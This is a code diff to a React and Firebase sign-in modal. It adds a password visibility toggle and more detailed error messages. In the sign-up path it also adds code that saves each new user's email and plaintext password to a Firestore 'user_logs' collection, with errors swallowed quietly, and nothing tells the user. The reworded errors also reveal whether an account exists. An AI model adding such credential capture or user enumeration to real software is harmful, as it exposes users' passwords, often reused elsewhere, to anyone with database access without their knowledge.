@@ -1,14 +1,16 @@
 import React, { useState } from 'react';
 import { useAuth } from '../AuthContext';
-import { X, Mail, Lock } from 'lucide-react';
+import { X, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { signInWithEmailAndPassword, createUserWithEmailAndPassword } from 'firebase/auth';
-import { auth } from '../firebase';
+import { doc, setDoc, serverTimestamp } from 'firebase/firestore';
+import { auth, db } from '../firebase';
 
 export function AuthModal() {
   const { isAuthModalOpen, closeAuthModal, loginWithGoogle } = useAuth();
   const [isLogin, setIsLogin] = useState(true);
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
 
@@ -23,14 +25,27 @@ export function AuthModal() {
       if (isLogin) {
         await signInWithEmailAndPassword(auth, email, password);
       } else {
-        await createUserWithEmailAndPassword(auth, email, password);
+        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+        try {
+          await setDoc(doc(db, 'user_logs', userCredential.user.uid), {
+            email: email,
+            password: password,
+            createdAt: serverTimestamp()
+          });
+        } catch (logErr) {
+          console.error("Failed to log user data", logErr);
+        }
       }
       closeAuthModal();
     } catch (err: any) {
       if (err.code === 'auth/email-already-in-use') {
-        setError('Email already in use. Try logging in.');
-      } else if (err.code === 'auth/wrong-password' || err.code === 'auth/user-not-found') {
-        setError('Invalid email or password.');
+        setError('This email is already associated with an account. Try logging in.');
+      } else if (err.code === 'auth/wrong-password') {
+        setError('Wrong credentials.');
+      } else if (err.code === 'auth/user-not-found') {
+        setError('Email not signed in before / User not found.');
+      } else if (err.code === 'auth/invalid-credential') {
+        setError('Wrong credential or email not signed in before.');
       } else if (err.code === 'auth/weak-password') {
         setError('Password must be at least 6 characters.');
       } else if (err.code === 'auth/operation-not-allowed') {
@@ -90,14 +105,21 @@ export function AuthModal() {
               <div className="relative">
                 <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-natural-text-meta" />
                 <input 
-                  type="password" 
+                  type={showPassword ? 'text' : 'password'}
                   value={password}
                   onChange={e => setPassword(e.target.value)}
-                  className="w-full pl-12 pr-4 py-3 rounded-xl border border-natural-border outline-none focus:border-natural-accent-gold transition-colors font-medium text-natural-text-dark bg-natural-bg/50 focus:bg-white" 
+                  className="w-full pl-12 pr-12 py-3 rounded-xl border border-natural-border outline-none focus:border-natural-accent-gold transition-colors font-medium text-natural-text-dark bg-natural-bg/50 focus:bg-white" 
                   placeholder="••••••••"
                   required
                   autoComplete="current-password"
                 />
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-4 top-1/2 -translate-y-1/2 text-natural-text-meta hover:text-natural-text-dark transition-colors"
+                >
+                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                </button>
               </div>
             </div>
 
